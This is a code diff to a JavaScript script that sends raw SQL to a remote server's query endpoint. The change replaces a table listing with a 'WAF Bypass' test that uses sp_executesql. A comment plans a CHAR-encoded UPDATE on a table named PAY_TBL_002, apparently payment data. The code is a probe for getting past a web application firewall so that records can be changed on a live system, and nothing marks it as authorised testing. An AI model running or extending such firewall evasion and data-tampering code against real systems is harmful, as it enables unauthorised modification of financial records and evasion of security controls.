@@ -8,6 +8,7 @@ async function main() {
     const finalUrl = `${serverSayanBaseUrl.replace(/\/$/, '')}/query`;
 
     async function executeQuery(sql) {
+        console.log(`Executing: ${sql}`);
         const response = await fetch(finalUrl, {
             method: 'POST',
             headers: {
@@ -18,18 +19,19 @@ async function main() {
             body: JSON.stringify({ query: sql })
         });
         const data = await response.json();
+        console.log("Response:", JSON.stringify(data, null, 2));
         return data.data || [];
     }
 
     try {
-        console.log("=== Listing all database tables ===");
-        const rows = await executeQuery(`
-            SELECT TABLE_NAME 
-            FROM INFORMATION_SCHEMA.TABLES 
-            WHERE TABLE_TYPE = 'BASE TABLE'
-            ORDER BY TABLE_NAME
+        console.log("=== Testing WAF Bypass using EXEC + CHAR ===");
+        // CHAR string for: UPDATE PAY_TBL_002 SET Field_013 = ...
+        // Let's see if EXEC is blocked
+        await executeQuery(`
+            DECLARE @sql NVARCHAR(MAX);
+            SET @sql = 'SELECT 1';
+            EXEC sp_executesql @sql;
         `);
-        console.log(JSON.stringify(rows, null, 2));
     } catch (e) {
         console.error("Error:", e);
     }
